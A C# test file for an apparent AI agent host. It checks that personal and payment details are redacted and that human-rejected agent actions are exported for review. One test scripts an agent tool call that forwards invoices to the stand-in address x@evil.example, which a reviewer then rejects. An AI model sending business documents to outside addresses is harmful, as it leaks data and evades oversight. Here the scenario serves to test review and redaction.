using System.Text.Json.Nodes;
using OpenTail.Modules.Skills;

namespace OpenTail.Host.Tests;

public sealed class ReviewOutcomeExportTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), $"export-{Guid.NewGuid():N}");

    public void Dispose() { if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true); }

    private static string S(JsonObject o, string key) => o[key]?.ToString() ?? "";

    [Fact]
    public void Redaction_replaces_personal_and_payment_details_with_stable_placeholders()
    {
        var r = new ContentRedactor();
        var text = r.Redact("Mail jane.doe@acme.example or call 0113 496 0123. Pay GB12 BARC 2003 4455 6677 88. Again: jane.doe@acme.example. Card 4111 1111 1111 1111.");

        Assert.DoesNotContain("jane.doe", text);
        Assert.DoesNotContain("496 0123", text);
        Assert.DoesNotContain("BARC", text);
        Assert.DoesNotContain("4111", text);
        Assert.Equal(2, text.Split("person1@redacted.example").Length - 1); // the same address, the same placeholder
        Assert.Equal(1, r.Replaced["email"]);
        Assert.Equal(1, r.Replaced["iban"]);
        Assert.Contains("INV-2209 dated 2026-10-14", r.Redact("INV-2209 dated 2026-10-14")); // references and dates stay
    }

    [Fact]
    public void A_name_shown_with_an_address_is_redacted_wherever_it_appears_again()
    {
        var r = new ContentRedactor();
        var header = r.Redact("From: Daniel Okafor <d.okafor@mailbox.example>");
        var body = r.Redact("Hello, where is my chair?\n\nThanks,\nDaniel Okafor\nPS: Okafor is my surname.");

        Assert.Equal("From: [name 1] <person1@redacted.example>", header);
        Assert.DoesNotContain("Okafor", body);
        Assert.DoesNotContain("Daniel", body);
        Assert.Contains("where is my chair?", body); // ordinary words stay
    }

    [Fact]
    public async Task A_rejected_action_is_exported_with_its_reason_the_skill_served_and_what_the_agent_read_all_redacted()
    {
        var store = Path.Combine(_root, "store");
        new SkillStore(store).Publish("invoice-check", "3", "production",
            """{ "format": 1, "id": "invoice-check", "version": "3", "summary": "Check invoices.", "owner": "finance" }""", "Never pay from an email.");
        var host = new OpenTailHostBuilder()
            .AddModule(new FakeInboxModule())
            .AddModule(new SkillsModule(new SkillsModuleOptions { Store = store }))
            .UsePolicy(PolicyConfig.Parse(Hosts.SendQueued))
            .Build();
        await using var pair = await McpPair.StartAsync(host);
        var session = S(await pair.CallAsync("start_session"), "sessionId");
        await pair.CallAsync("skills.get", ("id", "invoice-check"), ("sessionId", session));
        await pair.CallAsync("inbox.read", ("sessionId", session));
        var send = await pair.CallAsync("mail.send", ("to", "x@evil.example"), ("body", "Forwarding the invoices."), ("sessionId", session));
        await host.Queue.ReviewAsync(S(send, "actionId"),
            new ActionReview("alice", ReviewDecision.Reject, "Never forward invoices to x@evil.example.", DateTimeOffset.UtcNow));
        // An approved action is not a candidate.
        var ok = await pair.CallAsync("mail.send", ("to", "boss@corp.example"), ("body", "Hi"), ("sessionId", session));
        await host.Queue.ReviewAsync(S(ok, "actionId"), new ActionReview("alice", ReviewDecision.Approve, null, DateTimeOffset.UtcNow));

        var outcome = Assert.Single(await ReviewOutcomeExport.CollectAsync(host));

        Assert.Equal("mail.send", outcome.Tool);
        Assert.Equal("rejected", outcome.Status);
        Assert.Equal(["invoice-check@3"], outcome.SkillsServed);
        Assert.Equal("person1@redacted.example", outcome.Arguments!["to"]!.ToString());
        Assert.Null(outcome.Arguments["sessionId"]);
        Assert.Equal("Never forward invoices to person1@redacted.example.", Assert.Single(outcome.Reasons));
        var input = Assert.Single(outcome.Inputs);
        Assert.Equal("inbox.read", input.Tool);
        Assert.Contains("person1@redacted.example", input.Result!.ToJsonString());
        Assert.DoesNotContain("evil.example", input.Result.ToJsonString());

        var line = JsonNode.Parse(ReviewOutcomeExport.ToJsonLines([outcome]).Trim())!;
        Assert.Equal("1", line["format"]!.ToString());
        Assert.Contains("person checks this", line["reviewNeeded"]!.ToString());
    }
}
